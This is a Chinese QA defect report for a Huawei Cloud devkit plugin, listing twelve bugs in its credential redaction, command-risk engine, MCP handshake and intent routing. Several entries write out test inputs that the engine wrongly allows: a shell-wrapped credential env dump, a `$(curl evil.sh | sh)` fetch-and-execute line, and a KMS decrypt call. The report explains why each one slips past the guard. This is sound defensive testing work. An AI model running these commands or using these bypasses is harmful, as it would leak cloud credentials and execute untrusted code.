# FINDINGS — 缺陷发现清单（DSH-deepseek-v4.1-flash-1017）

> **落盘路径**：`results/DSH/2026-11-21-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-11-21 05:45（北京时间）
> **被测版本**：`huaweicloud-devkit v1.1.15`（npm `latest`，gitHead `bf79b643`，tag `v1.1.15`）
> **本轮结论**：12 项缺陷（5 P0 / 4 P1 / 3 P2，其中 1 项 SPEC-MISMATCH 待裁决）。146 例全部本轮实跑（未沿用旧证据）：PASS 131 / FAIL 11 / BLOCKED 2 / SPEC 1 / NOT_RUN 1（Windows 专属）。
> **跨版本观察**：对比 2026-11-20 的 `v2.0.0-next.4` 轮次，D2-4 / D4-3 / D4-17 / D3-S7 已在该 next 线修复，但当前 **v1.1.15 稳定线仍全部复现**，属稳定线未回合（backport）缺失；D4-16 / D4-21 / D8-9 / D9-12 / EXP-E01 在两条线上均存在。

## 汇总

| # | 级别 | 用例ID | 标题 | 状态 |
|---|---|---|---|---|
| 1 | P0 | `D2-4` | 凭证脱敏漏小写 `ak=`/`sk=`，明文残留 | 待提单 |
| 2 | P0 | `D4-3` | `kms DecryptData` 未被风险引擎拦截（allow） | 待提单 |
| 3 | P0 | `D4-16` | `sh -c` 包裹的凭证 env dump 绕过命令风险引擎 | 待提单 |
| 4 | P0 | `D4-21` | HCL/Terraform `actions=["*"]` 宽授权判 allow（JSON 同形判 deny） | 待提单 |
| 5 | P0 | `D9-12` | 未 initialize 直接 tools/list 未被拒绝（返回 40 工具） | 待提单 |
| 6 | P1 | `D4-17` | 命令替换 `$(...)` fail-open（allow） | 待提单 |
| 7 | P1 | `D3-S7` | 中文复合意图「部署 Web 应用 + RDS」仅命中 RDS，丢部署目标 | 待提单 |
| 8 | P1 | `D2-10` | KooCLI config 缺失错误消息拼接中文前缀，精确断言失配 | 待提单（契约方向待确认） |
| 9 | P1 | `EXP-E01` | 中文「云主机」意图路由 MISS，回落 help 文案 | 待提单 |
| 10 | P2 | `D8-9` | 遥测 `sanitizeValue` 不脱敏凭证（AK/secret/token 明文） | 待提单 |
| 11 | P2 | `D3-C14` | 沙箱无凭证抛中文文案，与英文契约断言不符 | 待提单（契约方向待确认） |
| 12 | P2 | `D1-68` | region 环境变量优先级与用例契约相反（`HW_REGION` 优先） | 待裁决 SPEC |

> 缺陷单：本轮 12 项经 `scripts/file_issue.py` 查重，全部命中 v1 稳定线历史合并单 [#1055](https://github.com/huaweicloud/huaweicloud-devkit/issues/1055)，已在该单追加 v1.1.15 复核评论（https://github.com/huaweicloud/huaweicloud-devkit/issues/1055#issuecomment-7051329430），不重复开单、不处理/关闭任何 GitHub issue；关联清单见同目录 `HISTORY_LINKS.md`。

---

## #1【P0】D2-4 凭证脱敏漏小写 `ak=`/`sk=`

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原文 `ak=AK123456 sk=SKsecret`（无脱敏）；大写 `AK=`/`SK=` 可正确替换为 `<redacted>`。
- **断言**：大小写 `ak=`/`sk=` 均应整体脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` 的兜底替换正则 `/(AK|SK)\s*[:=]\s*(...)/g` 区分大小写且无 `i` 标志；`src/safety-policy.mjs:49` 的 `redactSecrets` 对字符串只走该 `redactString`，无小写变体分支。
- **影响**：凭证以小写键名出现在日志/命令回显/遥测时明文外泄。
- **证据**：`evidence/D2-4/stdout.log`（detail：`redactSecrets('ak=AK123456 sk=SKsecret')=ak=AK123456 sk=SKsecret; 大写=AK=<redacted> SK=<redacted>`）

## #2【P0】D4-3 KMS `DecryptData` 未拦截

- **现象**：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` 返回 `{"decision":"allow","findings":[]}`。
- **断言**：KMS 解密属高危写操作，应 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:27-60` 的 `writeOperationPrefixes` 不含 `Decrypt`/`DecryptData`；`src/safety-policy.mjs:139` 据此判定写操作，未列入即按只读放行；`safety/rules/cloud-risk-rules.json`（19 条规则）亦无 KMS 解密覆盖。
- **影响**：越权解密密钥/密文不被拦截，且不会触发确认流。
- **证据**：`evidence/D4-3/stdout.log`

## #3【P0】D4-16 `sh -c` 包裹的凭证 env dump 穿透

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `{"decision":"allow","findings":[]}`。
- **断言**：应 `deny`（凭证类命令）。
- **根因**：`safety/rules/cloud-risk-rules.json:26` 的 `hwc-command-env-dump` 命令边界正则要求 `env` 前为行首或空白，`sh -c "env ..."` 中 `env` 前为双引号 → 不匹配；`src/risk-rule-engine.mjs` 的 shell 解包（`stripExecutable`，`src/safety-policy.mjs:180+`）只作用于 argv 数组路径，不参与文本规则匹配。
- **影响**：攻击者可用 shell 包裹绕过高危命令拦截，读取凭证环境变量。
- **证据**：`evidence/D4-16/stdout.log`

## #4【P0】D4-21 HCL/Terraform `actions=["*"]` 宽授权判 allow

- **现象**：HCL 片段 `resource "huaweicloud_iam_policy" "p" { actions = ["*"] }` 判定 `hcl=allow`；等价的 JSON `Action:"*"`+`Effect:"Allow"` 判 `deny`。
- **断言**：两种 IaC 形态均应 `deny`。
- **根因**：`safety/rules/cloud-risk-rules.json:196` 的 `hwc-iam-admin-policy` 要求同时出现 `Effect`+`Allow` 语义，HCL 片段只有 `actions = ["*"]`，无独立 HCL 宽授权分支（`:221 hwc-iam-highrisk-write` 也不覆盖），最终无命中即 allow。
- **影响**：Terraform/HCL 宽权限策略可绕过安全引擎落地，IaC 通道 fail-closed 缺失。
- **证据**：`evidence/D4-21/stdout.log`（why：`HCL IAM 未拦截: json=deny hcl=allow`）

## #5【P0】D9-12 未 initialize 直接 tools/list 未被拒绝

- **现象**：stdio 客户端不发 `initialize`、直接发 `tools/list`，服务端返回 40 个工具，无 `-32600`/时序错误。
- **断言**：未握手请求应返回协议错误（`-32600` 或等价）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:70` 的 `if (method === 'tools/list')` 直接返回 `TOOL_DEFINITIONS`，`handleMessage` 未维护「会话是否已 initialize」状态；会话状态只对 `initialize` 做副作用，无 pre-initialize 守卫。
- **影响**：MCP 协议状态机合规缺口，未握手客户端可枚举并调用全量工具。
- **证据**：`evidence/D9-12/stdout.log`（why：`未init先list 返回 40 工具`）

## #6【P1】D4-17 命令替换 `$(...)` fail-open

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `{"decision":"allow","findings":[]}`。
- **断言**：命令替换形态应 `deny` 或至少 `warn`（fail-closed）。
- **根因**：`safety/rules/cloud-risk-rules.json` 19 条规则中无 `$(` 命令替换模式；`src/risk-rule-engine.mjs` 未识别动态执行语法（仅有 `hwc-command-encoded-shell-exec` 覆盖编码形态）。
- **影响**：命令替换可装载并执行外部 payload。
- **证据**：`evidence/D4-17/stdout.log`

## #7【P1】D3-S7 中文复合意图丢失部署目标

- **现象**：`huaweicloud_service_catalog(intent="部署一个 Web 应用并连接 RDS 数据库")` 仅返回 `RDS`，未命中沙箱/部署类服务。
- **断言**：复合意图应同时命中 RDS + 部署目标（sandbox/ECS/SWR/CCE 等）。
- **根因**：`src/tools.mjs:2574` 的 `serviceCatalog` 中沙箱路由关键字（`:2743-2771`）只含 `sandbox/devstation/web app/hosting/网站/网页/静态` 等，无中文「部署」；`:2816` 的 `deploymentIntent` 重排逻辑要求沙箱技能**已命中**才生效，故纯中文「部署」意图不触发。分词（`:2803-2805`）按空格切分，中文整句只能整串 `includes`，进一步降低命中。
- **影响**：中文多服务复合意图路由丢目标，影响方案规划与部署链路。
- **证据**：`evidence/D3-S7/stdout.log`（detail：`仅部分命中: RDS`）

## #8【P1】D2-10 KooCLI config 缺失错误消息拼接中文前缀

- **现象**：fixture 断言 `readKooCliProfiles().error === "KooCLI config not found"`，实际为 `"KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)"` → 该子断言 FAIL（其余 5 项 profile 解析/切换断言 PASS）。
- **断言**：错误消息应精确等于 `KooCLI config not found`。
- **根因**：`plugins/huaweicloud-core/src/auth/guidance.mjs:71` 的 `messageZh: 'KooCLI(hcloud)未安装或未就绪。'` 被错误表拼接为「中文前缀 + 括号细节」，与用例精确文案契约冲突。
- **影响**：调用方按精确文本/前缀判断错误类型时失效；中文前缀是否保留需产品与用例共同裁决。
- **证据**：`evidence/D2-10/stdout.log`、`evidence/D2-10/detail.log`

## #9【P1】EXP-E01 中文「云主机」路由 MISS

- **现象**：`serviceCatalog(intent="帮我查一下我账号在华北北京四有哪些云主机")` 返回 `Run hcloud --help to list available services.`，未命中 ECS。
- **断言**：应路由到 ECS。
- **根因**：`src/tools.mjs:2578-2595` 的 ECS 路由关键字含 `云服务器/服务器/虚拟机/镜像`，但**不含「云主机」**（全仓 grep 无该词）；未命中即走 `:2817-2824` 的 help 兜底文案。
- **影响**：中文自然语言入口首选能力推荐失效，用户被导向 help。
- **证据**：`evidence/EXP-E01/stdout.log`

## #10【P2】D8-9 遥测 `sanitizeValue` 不脱敏凭证

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 原样返回，AK/secret/token 明文残留。
- **断言**：遥测值应脱敏 AK/secret/token 等凭证字段。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190` 的 `sanitizeValue` 仅做换行归一与长度截断（`MAX_VALUE_LENGTH`），完全未调用 `redactSecrets`/凭证正则。
- **影响**：遥测上报内容可能携带明文凭证。
- **证据**：`evidence/D8-9/stdout.log`

## #11【P2】D3-C14 沙箱无凭证中文文案与英文契约不符

- **现象**：无凭证时 `hdkitCheckUser` 抛错 `"未配置华为云凭证,需要先完成登录。"`；fixture 期望匹配 `/credentials are not configured/i` → FAIL（其余 9 项沙箱-hwlink 凭证断言 PASS）。
- **断言**：应抛英文 `credentials not configured`。
- **根因**：`src/auth/guidance.mjs:55` 的 `messageZh` 与 `src/auth/service.mjs:134` / `src/auth/credentials.mjs:286` 的中文文案取代了英文契约文案。
- **影响**：错误文案契约漂移，英文调用方/自动化按文案匹配失败；需裁决是否提供 i18n 双语或放宽断言。
- **证据**：`evidence/D3-C14/stdout.log`、`evidence/D3-C14/detail.log`

## #12【P2】D1-68 region 环境变量优先级契约漂移（SPEC-MISMATCH）

- **现象**：同时设置 `HW_REGION=cn-north-4` 与 `HUAWEICLOUD_REGION=cn-east-3` 时，实现取 `HW_REGION`；用例契约期望 `HUAWEICLOUD_REGION` 优先。
- **断言**：`HUAWEICLOUD_REGION` 应优先于旧的 `HW_REGION`。
- **根因**：`src/auth/credentials.mjs:225`（及 `:173`、`:339`）取值顺序为 `process.env.HW_REGION || process.env.HUAWEICLOUD_REGION`，旧变量优先。
- **影响**：合规命名变量的多环境场景可能被旧变量意外覆盖，region 归属错位。
- **证据**：`evidence/D1-68/stdout.log`

---

## 非缺陷项说明（环境/测试工程侧，不计入缺陷单）

| 用例 | 状态 | 说明 |
|---|---|---|
| `D3-C1` | PASS（复跑） | 首跑因 `hcloud` 对 API 错误（`VPC.0105 ConcurrentUpdateConflict`）仍返回 exit 0，探针误判删除成功而停止重试，残留 VPC；修正成功判定（exit 码 + 响应体错误码）并真机复跑：创建→ACTIVE→删除→ECS/VPC/子网/SG 全归零。 |
| `D4-24` | PASS（复跑） | 首跑因 landlock 沙箱禁止写 `~/.config/huaweicloud/approvals.json`，审批令牌持久化静默失败导致 `not_found`；改用工作区内可写 `HUAWEICLOUD_HOME` 复跑，一次性消费语义（首次 entry / 二次 null）通过，产品实现无误。 |
| `D3-S3` | BLOCKED | 沙箱预览链路 route→connect→upload→nginx→deploy_check 全部通过，`expose_tunnel` 因沙箱无 DevBridge 凭证（`authMode=NO_CREDENTIAL`）无法签发公网 URL；属执行环境凭证未注入。 |
| `D3-C7` | BLOCKED | 账号项目范围仅 `cn-north-4`：跨区 `ap-southeast-3` 的 ECS 只读返回 `Common.0013`、EIP 创建返回 `VPC.0501`，无法建删跨区资源；已实测 `list_regions` 含该区、plan 链路正常。 |
| `D1-39` | NOT_RUN | Windows 专属用例，Linux 环境按规则豁免。 |